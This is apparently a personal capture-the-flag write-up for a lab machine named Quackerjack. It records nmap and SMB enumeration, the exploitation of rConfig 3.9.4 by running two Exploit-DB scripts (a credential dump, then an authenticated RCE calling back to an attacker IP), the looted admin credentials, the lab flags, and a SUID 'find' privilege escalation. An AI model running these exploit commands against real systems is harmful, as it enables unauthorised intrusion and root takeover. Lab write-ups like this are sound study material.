# Quackerjack \[Linux]

## Enumeration

```
192.168.146.57
Nmap scan report for 192.168.146.57
Host is up (0.095s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open              Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: 400 Bad Request
Service Info: Host: QUACKERJACK; OS: Unix

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m14s, median: 0s
| smb2-time: 
|   date: 2026-02-26T03:54:49
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: quackerjack
|   NetBIOS computer name: QUACKERJACK\x00
|   Domain name: \x00
|   FQDN: quackerjack
|_  System time: 2026-02-25T22:54:47-05:00

```

#### UDP

```
sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv 192.168.146.57
Nothing noteworthy
```

### Files

None

### Ports

#### FTP

anonymous login successful but unable to list directories or get files

#### SMB/RPC

```
nxc smb 192.168.146.57 -u guest -p '' --shares   
SMB         192.168.146.57  445    QUACKERJACK      [*] Unix - Samba (name:QUACKERJACK) (domain:) (signing:False) (SMBv1:True)                                                                                                          
SMB         192.168.146.57  445    QUACKERJACK      [-] \guest: STATUS_LOGON_FAILURE 
```

#### HTTP

#### 80

Default welcome page

#### 8081

RConfig 3.9.4

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>



### Exploits

{% embed url="https://www.exploit-db.com/exploits/48208" %}
Add user or dump admin creds
{% endembed %}

```
python3 48208.py https://192.168.146.57:8081
```

{% embed url="https://www.exploit-db.com/exploits/48241" fullWidth="false" %}
Authenticate RCE
{% endembed %}

```
python3 48241.py https://192.168.146.57:8081 admin abgrtyu 192.168.45.167 8081
```

### Loot

#### Creds

`admin:abgrtyu`

#### Flags

```
3c0167261026d868de039cd7a2487697
1bc0fba962b8860227616b39f29de1ac
```

## Initial Foothold

Chained exploits - add user didn't work so dump admin creds and authenticated RCE

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

`find` binary has SUID set, get euid of root and add to sudoers just to make sure

<div align="left"><figure><img src="../../.gitbook/assets/image (94).png" alt="" width="363"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (95).png" alt="" width="450"><figcaption></figcaption></figure></div>

## Post Exploitation

<div align="left"><figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure></div>
